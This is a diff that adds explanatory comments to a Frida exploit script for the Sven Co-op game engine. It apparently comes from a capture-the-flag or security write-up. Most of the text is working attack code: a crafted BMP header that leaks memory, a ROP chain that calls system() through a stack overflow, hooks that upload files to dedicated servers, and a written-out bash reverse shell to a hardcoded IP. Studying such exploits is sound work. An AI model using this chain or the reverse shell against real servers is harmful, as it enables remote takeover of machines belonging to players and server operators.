@@ -4,6 +4,12 @@ console.log('[+] hw.dll =', hw.base);
 var basePath = hw.path.substring(0, hw.path.length - 6) + 'svencoop_downloads\\';
 console.log('[+] basePath =', basePath);
 
+// The plugin doesn't check the bfOffBits (offset 0xA) field, which is the offset from
+// the beginning of the file to pixels data, and mmaped regions will always have
+// the same relative distance to libc, so we get a very powerful arbitrary leak.
+// We will read the main TCB, which have the stack canary as well as a libc pointer.
+// To find the main TCB, we can use `search` command in pwndbg to search for the canary.
+
 const leakBmpHeader = [0x42, 0x4d, 0x36, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xaf, 0xa5, 0xff, 0x28, 0x00,
     0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x01, 0x00, 0x18, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
@@ -13,9 +19,12 @@ File.writeAllBytes(basePath + 'headicons\\leak.bmp', leakBmpHeader);
 File.writeAllBytes(basePath + 'x.xyz', new ArrayBuffer('bash -i >& /dev/tcp/123.123.123.123/4242 0>&1\n'));
 
 function makeExploit(sprData) {
+    // SPR file processing: https://github.com/yuraj11/HL-Texture-Tools/blob/master/HL%20Texture%20Tools/HLTools/SpriteLoader.cs
     var palette = new Uint8Array(sprData.slice(42, 810));
     var bitmap = new Uint8Array(sprData.slice(830, sprData.length));
     var data = new Uint8Array(768);
+
+    // SPR uses RGB while BMP uses BGR, so we need to convert to reconstruct the original memory layout
     for (let i = 0; i < 16; ++i) {
         for (let j = 0; j < 16; ++j) {
             data[48 * i + j * 3 + 0] = palette[bitmap[(15 - i) * 16 + j] * 3 + 2];
@@ -28,6 +37,11 @@ function makeExploit(sprData) {
     var canary = dataView.getUint32(0xd4, true);
     console.log("[+] libc =", libc.toString(16));
     console.log("[+] canary =", canary.toString(16));
+
+    // The plugin build a RGB palette based on every different color in the original BMP.
+    // However while the maximum size of the palette buffer on stack is 256 * 3 = 768 bytes, there are no OOB checks.
+    // If the BMP has too many different colors, a stack BOF will happen.
+    // We abuse this to overwrite return address and start our ROP chain, which will call system().
 
     var rop2 = new Uint32Array(12);
     rop2[0] = libc + 0x000b3f3c; // add dword ptr [eax], esp ; ret
@@ -95,6 +109,10 @@ function makeExploit(sprData) {
     f.close();
 }
 
+// Diff patching `engine_i686.so`, we see that it is possible to upload files to dedicated servers.
+// By analyzing engine_i686.so, we found out that files are sent from the server by calling `Netchan_CreateFragments` and `Netchan_FragSend`.
+// Since the network code are shared between client and server, we can find and call these functions on client as well.
+
 var Netchan_CreateFragments = new NativeFunction(hw.base.add(0x750E0), 'void', ['int', 'pointer', 'pointer'], { exceptions: 'propagate' });
 var Netchan_FragSend = new NativeFunction(hw.base.add(0x75730), 'void', ['pointer'], { exceptions: 'propagate' });
 var clsChanAddr = hw.base.add(0x399A38);
@@ -105,6 +123,7 @@ function sendFile(path) {
     Netchan_FragSend(clsChanAddr);
 }
 
+// We intercept `upload` console command to upload files, since the original function will only upload customization data (i.e. custom spray)
 var CL_BeginUpload_fAddr = hw.base.add(0x2AE20);
 var CL_BeginUpload_f = new NativeFunction(CL_BeginUpload_fAddr, 'void', [], { exceptions: 'propagate' });
 var Cmd_Argv = new NativeFunction(hw.base.add(0x39810), 'pointer', ['int'], { exceptions: 'propagate' });
@@ -118,6 +137,7 @@ Interceptor.replace(CL_BeginUpload_fAddr, new NativeCallback(() => {
     CL_BeginUpload_f();
 }, 'void', []));
 
+// We intercept `CL_ProcessFile`, because it's where downloaded data from servers are processed.
 var CL_ProcessFileAddr = hw.base.add(0x29B80);
 var CL_ProcessFile = new NativeFunction(CL_ProcessFileAddr, 'void', ['int', 'pointer'], { exceptions: 'propagate' });
 
